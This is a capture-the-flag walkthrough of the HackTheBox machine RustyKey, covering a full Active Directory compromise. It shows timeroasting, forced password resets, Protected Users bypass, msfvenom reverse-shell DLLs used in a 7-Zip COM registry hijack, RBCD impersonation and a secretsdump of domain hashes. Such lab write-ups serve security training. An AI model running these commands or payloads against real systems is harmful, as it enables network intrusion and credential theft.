# RECON

## Creds

Machine infomation:

> As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: `rr.parker / 8#t5HE8L!W3A`

## Port Scan

$ rustscan -a $target_ip --ulimit 2000 -r 1-65535 -- -A -sC -Pn

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-06-29 09:59:39Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
49741/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 9634/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 65392/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44675/udp): CLEAN (Failed to receive data)
|   Check 4 (port 45774/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-06-29T10:00:46
|_  start_date: N/A
|_clock-skew: 7h59m58s

- **Domain**: `rustykey.htb`
- **Host**: `DC.rustykey.htb`

## Enum

### Kerberos

NTLM auth is disabled (`STATUS_NOT_SUPPORTED`):

$ nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A'

SMB         10.129.221.13   445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.221.13   445    dc               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED

We pivot to Kerberos.

Our first move: generate a custom `krb5.conf` configuration file:

Bash

nxc smb rustykey.htb \
	-u 'rr.parker' -p '8#t5HE8L!W3A' \
	--generate-krb5-file /tmp/rustkey.krb5

Resulting configuration:

INI

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = RUSTYKEY.HTB

[realms]
    RUSTYKEY.HTB = {
        kdc = dc.rustykey.htb
        admin_server = dc.rustykey.htb
        default_domain = rustykey.htb
    }

[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB

We set the battlefield context:

Bash

export KRB5_CONFIG=/tmp/rustkey.krb5

With the stage prepared, we strike using Netexec in Kerberos mode (`-k`):

Bash

./ft.sh rustykey.htb \
nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k -d 'rustykey.htb'

> **Error Countermeasure: `KRB_AP_ERR_SKEW`**
> 
> Kerberos doesn't tolerate time drift. If authentication fails due to skew, realign time using `faketime` — as demonstrated [Certified writeup](https://4xura.com/ctf/htb/htb-writeup-certified/#toc-head-7) — or deploy a shell wrapper mentioned in the [Haze writeup](https://4xura.com/ctf/htb/htb-writeup-haze/#toc-head-17), tailored for Arch Linux. That's my play here.

Mission accomplished:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_1.jpg)

### Netexec

Now we can begin some basic enumeration with Netexec:

Bash

./ft.sh rustykey.htb \
nxc smb dc.rustykey.htb \
	-u 'rr.parker' -p '8#t5HE8L!W3A' -k -d 'rustykey.htb' \
	--users

As a result:

SMB         dc.rustykey.htb 445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         dc.rustykey.htb 445    dc               Administrator                 2025-06-04 22:52:22 0       Built-in account for administering the computer/domain
SMB         dc.rustykey.htb 445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         dc.rustykey.htb 445    dc               krbtgt                        2024-12-27 00:53:40 0       Key Distribution Center Service Account
SMB         dc.rustykey.htb 445    dc               rr.parker                     2025-06-04 22:54:15 0
SMB         dc.rustykey.htb 445    dc               mm.turner                     2024-12-27 10:18:39 0
SMB         dc.rustykey.htb 445    dc               bb.morgan                     2025-06-29 11:01:39 0
SMB         dc.rustykey.htb 445    dc               gg.anderson                   2025-06-29 11:01:39 0
SMB         dc.rustykey.htb 445    dc               dd.ali                        2025-06-29 11:01:39 0
SMB         dc.rustykey.htb 445    dc               ee.reed                       2025-06-29 11:01:39 0
SMB         dc.rustykey.htb 445    dc               nn.marcos                     2024-12-27 11:34:50 0
SMB         dc.rustykey.htb 445    dc               backupadmin                   2024-12-30 00:30:18 0
SMB         dc.rustykey.htb 445    dc               [*] Enumerated 11 local users: RUSTYKEY

There's `backupadmin` who seems to be our ultimate target in this game.

### BloodHound

Let's unleash BloodHound — over Kerberos.

Bash

./ft.sh rustykey.htb \
bloodhound-python -u 'rr.parker' -p '8#t5HE8L!W3A' -d 'rustykey.htb' -ns $target_ip --zip -c All -dc 'dc.rustykey.htb'

The surface looks quiet — no juicy DACL abuse from our current foothold:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_2.jpg)

But BloodHound's Map reveals a promising avenue: the **`COMPUTERS@RUSTYKEY.HTB`** Organizational Unit.

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_3.jpg)

This is an OU containing 5 computer objects, which are likely domain-joined workstations:

- `IT-COMPUTER1.RUSTYKEY.HTB`
- `IT-COMPUTER2.RUSTYKEY.HTB`
- `IT-COMPUTER3.RUSTYKEY.HTB`
- `IT-COMPUTER4.RUSTYKEY.HTB`
- `IT-COMPUTER5.RUSTYKEY.HTB`

Among them, we see the 3rd computer account `IT-COMPUTER3$` has the **`AddSelf` privilege** on the **`HELPDESK`** group:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_4.jpg)

Wait, why Does a **computer account** want to add itself to a **group**? This means if we control `IT-COMPUTER3$`, then we can abuse this by impersonating `IT-COMPUTER3$` and **adding the machine account** to the `HELPDESK` group.

> `AddSelf` is a **delegated right** in Active Directory that lets a principal **add itself** to a security group.

Diving deeper, the BloodHound graph shows a **clear and actionable privilege escalation path** stemming from the `HELPDESK` group:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_5.jpg)

- **ForceChangePassword**: Reset passwords for linked users — **no creds required**
- **GenericWrite**: Full manipulation of `dd.ali` — from SPN planting to privilege grafting
- **AddMember**: Grant group membership into `PROTECTED OBJECTS@RUSTYKEY.HTB`

The map just lit up. Our next objective: compromise `IT-COMPUTER3.RUSTYKEY.HTB` and kickstart the escalation game.

# Computers

Here's the current challenge — We cannot directly compromise a computer object (like `IT-COMPUTER3$`) unless we have specific rights over it, such as `GenericWrite`, `WriteDacl`, or `WriteOwner`.

Therefore, we will need a vulnerability against the Windows AD itself or other attack vectors to move on.

## Timeroasting

Timeroasting is a **post-compromise Kerberos credential harvest technique** that targets **machine account passwords** via the **NTP (Network Time Protocol)** between domain-joined computers and their Domain Controller. Released by the _Tom Tervoort_ from _Secura_ team in this [whitepaper](chrome-extension://efaidnbmnnnibpcajpcglclefindmkaj/https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf).

### Workflow

This is how it works:

1. **Domain-joined Windows machines use NTLM-hashed MACs in NTP replies** to ensure trusted time synchronization.
2. In each NTP request, the client includes its **RID**, and the DC includes a **MAC**, typically using algorithms like **HMAC-SHA512** or, for compatibility, a **broken MD5-MD4-based MAC**—the latter being the vector for timeroasting.
3. The attack then works as follows:
    - We send an NTP request with **any chosen computer's RID** to the DC.
    - The DC responds with a MAC of the NTP packet, keyed with the **NTLM hash of that computer account**.
    - We've effectively received a **salted MAC** of the account's password, which we can crack offline if the machine password.

The logic echoes Kerberoasting—but this time, it's machines over NTP.

Same as the K one, if any targeted domain computer accounts still use **weak legacy passwords**, such as the machine name or simple defaults, we can then crack it offline after retrieving the **SNTP hashes**.

### Exploit

The _Secura_ team releases a [repo](https://github.com/SecuraBV/Timeroast) for exploitation, which has been recently integrated into [Netexec](https://www.netexec.wiki/news/v1.4.0-smoothoperator#timeroasting-the-domain).

Netexec's new module makes it dead simple:

Bash

nxc smb dc.rustykey.htb -M timeroast

Output floods in:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_6.jpg)

Since our target is `IT-COMPUTER3.RUSTYKEY.HTB`, whose Object ID is:

S-1-5-21-3316070415-896458127-4139322052-1125

The last 4 numbers represent its RID: `1125`. So we take the corresponding SNTP hash:

$sntp-ms$05975c94bbd012c0af34cded0a05f735$1c0111e900000000000a5ba54c4f434cec0b4a64ef61fe21e1b8428bffbfcd0aec0bc3370359a4b7ec0bc3370359e477

Target hash in hand, we arm [Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes#:~:text=31300,MS%20SNTP) with mode `31300` (update to the newer version if you are still using the legacy one). Success:

$sntp-ms$05975c94bbd012c0af34cded0a05f735$1c0111e900000000000a5ba54c4f434cec0b4a64ef61fe21e1b8428bffbfcd0aec0bc3370359a4b7ec0bc3370359e477:Rusty88!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 31300 (MS SNTP)
Hash.Target......: $sntp-ms$05975c94bbd012c0af34cded0a05f735$1c0111e90...59e477

We now have a compromised computer account `IT-COMPUTER3.RUSTYKEY.HTB`, whose **SAM name** is **`IT-COMPUTER3$`** (trailing `$` for machine accounts) for **Kerberos / SMB / LDAP auth**.

# USER

With `IT-COMPUTER3$` under our control, we can now trigger the **privilege chain** BloodHound mapped for us:

IT-COMPUTER3$
⇨ AddSelf:                                join HELPDESK group
⇨ ForceChangePassword / GenericWrite:     reset user passwords
⇨ AddMember:                              escalate among groups

## Addself

We exploit `IT-COMPUTER3$`'s delegated **`AddSelf`** right to enroll into the `HELPDESK` group:

Bash

./ft.sh rustykey.htb \
bloodyAD --host dc.rustykey.htb -d rustykey.htb \
	-u 'IT-COMPUTER3$' -p 'Rusty88!' -k \
	add groupMember HELPDESK 'IT-COMPUTER3$'

Then we inherit all the delegated privileges of `HELPDESK`:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_7.jpg)

## ForceChangePassword

With HELPDESK privileges unlocked (e.g., `ForceChangePassword` ), we are able to reset user credentials for `BB.MORGAN`, `EE.REED`, `GG.ANDERSON`, `DD.ALI`— no old password needed::

Bash

./ft.sh rustykey.htb \
bloodyAD --host dc.rustykey.htb -d rustykey.htb \
	-u 'IT-COMPUTER3$' -p 'Rusty88!' -k \
	set password BB.MORGAN 'Axur@4sure'
	
./ft.sh rustykey.htb \
bloodyAD --host dc.rustykey.htb -d rustykey.htb \
	-u 'IT-COMPUTER3$' -p 'Rusty88!' -k \
	set password EE.REED 'Axur@4sure'
	
./ft.sh rustykey.htb \
bloodyAD --host dc.rustykey.htb -d rustykey.htb \
	-u 'IT-COMPUTER3$' -p 'Rusty88!' -k \
	set password GG.ANDERSON 'Axur@4sure'
	
./ft.sh rustykey.htb \
bloodyAD --host dc.rustykey.htb -d rustykey.htb \
	-u 'IT-COMPUTER3$' -p 'Rusty88!' -k \
	set password DD.ALI 'Axur@4sure'

But TGT request fails:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_9.jpg)

This means the KDC rejected the TGT request because the **encryption type** (`etype`) used by `getTGT.py` is **not allowed** by the domain or account policy.

The domain might have **disabled weak encryption types** (RC4, DES). It is common in **hardened environments** or for **Protected Users** revealed from BloodHound.

## Protected Users Bypass

### Vuln

Except `DD.ALI`, the other 3 users have a same DACL mapping. Take `BB.MORGAN` as an example:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_8.jpg)

They are members of multiple nested groups:

- Being in `REMOTE MANAGEMENT USERS` **grants them remote login rights**
- They are not direct members of the built-in `PROTECTED USERS` group — there's a custom "middle man" `PROTECTED OBJECTS` in between.

Their path to privilege flows through a custom intermediary group: `PROTECTED OBJECTS`. It means we can use the `AddMember` priv to _disconnect_ the restrictions from `Protected Users` by removing the target out of it:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_10.jpg)

### AddMember

We dismantle the chain of inheritance by removing their department group (e.g., `IT`) from `PROTECTED OBJECTS`.

Bash

./ft.sh rustykey.htb \
bloodyAD --host dc.rustykey.htb -d rustykey.htb \
	-u 'IT-COMPUTER3$' -p 'Rusty88!' -k \
	remove groupMember 'PROTECTED OBJECTS' 'IT'

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_11.jpg)

> Repeat as needed for other nested memberships like `SUPPORT` for `EE.REED`.

## Winrm

Now that the domain no longer enforces hardened restrictions, we request a TGT:

Bash

./ft.sh rustykey.htb \
getTGT.py 'rustykey.htb/BB.MORGAN:Axur@4sure'

And land a shell on the DC with Evilwinrm:

Bash

./ft.sh rustykey.htb \
env KRB5CCNAME=BB.MORGAN.ccache \
evil-winrm -i dc.rustykey.htb -r rustykey.htb

Foothold secured. User flag captured:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_12.jpg)

# ROOT

## BloodHound

A good practice to harvest fresh domain information after compromising a new accout:

Bash

./ft.sh rustykey.htb \
env KRB5CCNAME=BB.MORGAN.ccache \
bloodhound-python -u 'bb.morgan' -k -d 'rustykey.htb' -ns $target_ip --zip -c All -dc 'dc.rustykey.htb'

Except those compromised ones, remember we still have `mm.turner`, `nn.macros` and `backupadmin` found in early user enumeration.

While users like `nn.macros` appear limited (just `HELPDESK`), and `backupadmin` screams high-value target, the real spark is **`mm.turner`** — a member of the **`DELEGATIONMANAGER@RUSTYKEY.HTB`** group:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_13.jpg)

The group name `DELEGATIONMANAGER` strongly suggests a **delegation-related privilege**, which would definitely be the target we are interested in.

## Registry CLSID Hijack

### Hints in Email

From the desktop, we discover the `internal.pdf`, which is a mail:

> Internal Memo From: bb.morgan@rustykey.htb To: support-team@rustykey.htb Subject: Support Group - Archiving Tool Access Date: Mon, 10 Mar 2025 14:35:18 +0100
> 
> Hey team,
> 
> As part of the new Support utilities rollout, extended access has been temporarily granted to allow testing and troubleshooting of file archiving features across shared workstations.
> 
> This is mainly to help streamline ticket resolution related to extraction/compression issues reported by the Finance and IT teams. Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase.
> 
> A few notes:
> 
> - Please avoid making unrelated changes to system components while this access is active.
> - This permission change is logged and will be rolled back once the archiving utility is confirmed stable in all environments.
> - Let DevOps know if you encounter access errors or missing shell actions.
> 
> Thanks, BB Morgan IT Department

The **internal memo** (`internal.pdf`) leaks a critical oversight — **temporary elevated privileges** for the `Support` group during the rollout of a new **archiving utility** across Finance and IT systems:

- `EE.REED`, part of the `Support` team, may now **write to sensitive registry keys**
- Shell extensions, especially those triggered by **right-click or context menu actions**, are prime targets
- Mentions that systems will **auto-trigger shell actions** under certain circumstances.
- The privilege window is **temporary** — they know it's dangerous!

### Context Analysis

Based on the internal memo we found:

> … _extended access has been temporarily granted to allow testing and troubleshooting of file archiving features across shared workstations._
> 
> …
> 
> _This is mainly to help streamline ticket resolution related to extraction/compression issues_ …
> 
> …
> 
> _… registry-level adjustments are expected during this phase._
> 
> …
> 
> … _missing shell actions._

This tells us:

- The registry path relates to **shell/context menu behavior**
- It affects “newer systems”
- “Registry-level adjustments” are tied to an **archiving utility**

Shell behavior in Windows is typically driven by keys under:

HKCR\*\shell\
HKCR\Directory\shell\
HKCR\SystemFileAssociations\
HKCR\CLSID\

But `HKCR\` is only a **merged view** of:

- `HKLM\Software\Classes` (machine-wide)
- `HKCU\Software\Classes` (user-specific)

Real impact usually comes from modifying the **machine-wide layer**:

HKLM\Software\Classes

Additionally, the email references **archiving tools**. Many **shell extensions and COM objects** are registered using **CLSID entries** under that path.

> **CLSID** stands for **Class Identifier**.
> 
> It's a **128-bit GUID** (Globally Unique Identifier) that uniquely identifies a **COM class object** in Windows.
> 
> It's something like:
> 
> "Hey, when someone requests this feature (e.g., '7-Zip Add to Archive'), here's the exact DLL/exe/handler that should be used to do it."
> 
> In particular, **COM shell extensions** (like 7-Zip or WinRAR) are registered using **CLSID entries**:
> 
> HKLM\Software\Classes\CLSID\{GUID}\InprocServer32

Each `CLSID` maps to a shell handler — telling Windows _what to load and execute_ when a user interacts with the UI (e.g., via right-click on files).

### EE.REED Pivot

To inspect the registry abuse path, we pivot to `EE.REED`, a member of the temporarily privileged `SUPPORT` group. We reuse the same exploitation chain:

Bash

# AddSelf → HELPDESK
./ft.sh rustykey.htb \
bloodyAD --host dc.rustykey.htb -d rustykey.htb \
    -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \
    add groupMember HELPDESK 'IT-COMPUTER3$'

# ForceChangePassword → EE.REED
./ft.sh rustykey.htb \
bloodyAD --host dc.rustykey.htb -d rustykey.htb \
    -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \
    set password EE.REED 'Axur@4sure'

# Remove from Protected Users (via PROTECTED OBJECTS)
./ft.sh rustykey.htb \
bloodyAD --host dc.rustykey.htb -d rustykey.htb \
    -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \
    remove groupMember 'PROTECTED OBJECTS' 'SUPPORT'

Then request a TGT and initial attempt via WinRM:

Bash

# TGT
./ft.sh rustykey.htb \
getTGT.py 'rustykey.htb/EE.REED:Axur@4sure'

# Winrm
./ft.sh rustykey.htb \
env KRB5CCNAME=EE.REED.ccache \
evil-winrm -i dc.rustykey.htb -r rustykey.htb

But it seems there's some other restriction to forbidden remote Winrm logon:

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied<br>Success

We fallback to a **credential-based local execution** from `BB.MORGAN`'s existing shell using `runascs.exe`. This allows executing a process under another user's token without needing WinRM:

PowerShell

.\runascs.exe EE.REED "Axur@4sure" powershell.exe -r 10.10.13.2:4444

This bypasses the remote login policy by launching a reverse shell **locally**, impersonating `EE.REED`:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_14.jpg)

> **Note:** This only works **after** the following conditions are met:
> 
> - `EE.REED`'s password has been changed
> - `Protected Users` restrictions have been lifted

We're inside with `EE.REED`'s context — ready to begin registry inspection and hijack setup.

### CLSID Enumeration

Now pivoted as `EE.REED`, we begin probing for registry weak points.

The internal memo already gave it away:

> _"…ticket resolution related to extraction/compression issues"_
> 
> _"...testing and troubleshooting of file archiving features..."_
> 
> _"...context menu actions..."_
> 
> _"...registry-level adjustments..."_

This strongly implies **any Archiving/Compression-related context menu handlers** might be involved. On a Windows target, there potentially includes:

- WinRAR
- WinZip
- Windows built-in ZIP handler
- 7-Zip
- PeaZip
- Bandizip
- Tar
- GZip
- LZMA

Using the following script, we filter for CLSIDs with compression-related semantics:

PowerShell

$keywords = '7-Zip|Compress|Extract|Archive|Zip|RAR|Tar|LZMA'

Get-ChildItem 'HKLM:\Software\Classes\CLSID' | ForEach-Object {
    try {
        $props = Get-ItemProperty -Path $_.PSPath
        $desc = $props.'(default)'
        if ($desc -and ($desc -match $keywords)) {
            [PSCustomObject]@{
                CLSID       = $_.PSChildName
                Description = $desc
            }
        }
    } catch {}
}

We hit several suspicious candidates:

PS C:\temp> .\enum_reg.ps1

CLSID                                  Description
-----                                  -----------
...
{23170F69-40C1-278A-1000-000100020000} 7-Zip Shell Extension

{2737EE87-ABA3-4F28-89A6-C370484D85F9} Compressed File Extract To verb handler
{BD472F60-27FA-11cf-B8B4-444553540000} Compressed (zipped) Folder Right Drag Handler
{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31} CompressedFolder
...

Now that we've narrowed it down to relevant CLSIDs with compression/extraction semantics, the next logical step is to **enumerate their handlers**, particularly:

1. DLL path used (`InProcServer32`)
2. Who owns the key and its ACL (permissions)
3. Whether the DLL is **writable or replaceable** by our controlled users

Among them, the **7-Zip Shell Extension** stands out — its name hints at **auto-loading via Explorer**. So first we can check the **ACLs of the registry key itself** (`InprocServer32`) under the CLSID to see if we can have write access to edit the key:

PS C:\temp> Get-Acl "HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | Format-List

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000-0001000
20000}\InprocServer32
Owner  : BUILTIN\Administrators
Group  : RUSTYKEY\Domain Users
Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
BUILTIN\Administrators Allow  FullControl
CREATOR OWNER Allow  FullControl
RUSTYKEY\Support Allow  FullControl

NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
BUILTIN\Users Allow  ReadKey
Audit  :
Sddl   : O:BAG:DUD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;BA)(A;CIIOID;KA;;;CO)(A;CIID;KA;;;S-1-5-21-3316070415-896458127-4139322
052-1132)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;BA)(A;CIID;KR;;;BU)

**Confirmed** — `Support` has **FullControl**, as the email indicates.

This means we can overwrite:

HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32

This key controls the **DLL path** used for the **7-Zip Shell Extension CLSID**. If we can **overwrite the `(Default)` value** in this key to point to a **malicious DLL**, and trigger a **COM activation** of that CLSID, it will **load our DLL** with the privileges of the calling process — which it should, according to the email:

> _"Let DevOps know if you encounter access errors or missing shell actions"._

It implies a privileged user (`DevOps`) might trigger the shell extension — they'll be the one testing the integration — causing our malicious DLL to be loaded in their security context.

### Exploit

> _"Please avoid making unrelated changes to system components while this access is active."_

— Sure. We'll only hijack the system.

First, generate a **Meterpreter DLL payload** using `msfvenom`:

Bash

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.13.2 LPORT=4445 -f dll -o win.dll

Upload the DLL and hijack the vulnerable COM handler:

PowerShell

Set-ItemProperty -Path "HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "(default)" -Value "C:\temp\win.dll"

Then wait.

`MM.TURNER`, part of the **`DELEGATIONMANAGER`** group and involved in DevOps testing, triggers the shell extension — likely through Explorer or archive testing:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_15.jpg)

A golden account.

## RBCD

The Meterpreter session is short-lived, likely due to AV or EDR termination. So we switch gears — less malicious, more subtle.

Build a **PowerShell reverse shell DLL**:

Bash

msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e JABjAGwAa...' EXITFUNC=none -f dll > noharm.dll

Drop `noharm.dll`, and reapply hijack:

PowerShell

Set-ItemProperty -Path "HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "(default)" -Value "C:\temp\noharm.dll"

Catch a **clean reverse shell** as `MM.TURNER`. And we knew he's a member of the **`DELEGATIONMANAGER`** group, thus verify if we have rights to modify the **`msDS-AllowedToActOnBehalfOfOtherIdentity`** property of `DC`:

PowerShell

Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_16.jpg)

The current `PrincipalsAllowedToDelegateToAccount` is empty (`{}`), meaning **no accounts are currently allowed to impersonate users to `DC`**.

But as a member from the special group, we can try to **add a victim**, e.g. `IT-COMPUTER3$` (with fixed password so we don't need extra operations to change user credentials), **to that list**, as being a true **"Delegation Manager"** to poison DC:

PowerShell

Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount "IT-COMPUTER3$"

Verify the new delegation entry:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_17.jpg)

Now we launch the classic **RBCD impersonation attack**:

Bash

./ft.sh rustykey.htb \
getST.py 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!' -k \
		-spn 'cifs/DC.rustykey.htb' \
		-impersonate backupadmin \
		-dc-ip $target_ip

Then use the acquired `.ccache` TGT to access the target as `backupadmin`:

Bash

./ft.sh rustykey.htb \
env KRB5CCNAME=backupadmin.ccache \
wmiexec.py -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb'

And we knew `backupadmin` (member of `ENTERPRISE ADMINS`) is a super account confirmed from BloodHound, he already has the local Administrator priv:

![](https://cdn.jsdelivr.net/gh/4xura/AxuraDesign@main/blog_posts/HTB-Writeup-RustyKey/htb_rustykey_18.jpg)

Rooted. And dump all secretes:

$ ./ft.sh rustykey.htb \
env KRB5CCNAME=backupadmin.ccache \
secretsdump.py -k -no-pass RUSTYKEY.HTB/backupadmin@dc.rustykey.htb -dc-ip $target_ip

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
RUSTYKEY\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25
RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
[*] DefaultPassword
RUSTYKEY\Administrator:Rustyrc4key#!
[*] DPAPI_SYSTEM
dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397
dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c
[*] NL$KM
 0000   6A 34 14 2E FC 1A C2 54  64 E3 4C F1 A7 13 5F 34   j4.....Td.L..._4
 0010   79 98 16 81 90 47 A1 F0  8B FC 47 78 8C 7B 76 B6   y....G....Gx.{v.
 0020   C0 E4 94 9D 1E 15 A6 A9  70 2C 13 66 D7 23 A1 0B   ........p,.f.#..
 0030   F1 11 79 34 C1 8F 00 15  7B DF 6F C7 C3 B4 FC FE   ..y4....{.o.....
NL$KM:6a34142efc1ac25464e34cf1a7135f34799816819047a1f08bfc47788c7b76b6c0e4949d1e15a6a9702c1366d723a10bf1117934c18f00157bdf6fc7c3b4fcfe
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7a351e12f70cc177a1d5bd11b28ac26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4ad30fa8d8f2cfa198edd4301e5b0f3:::
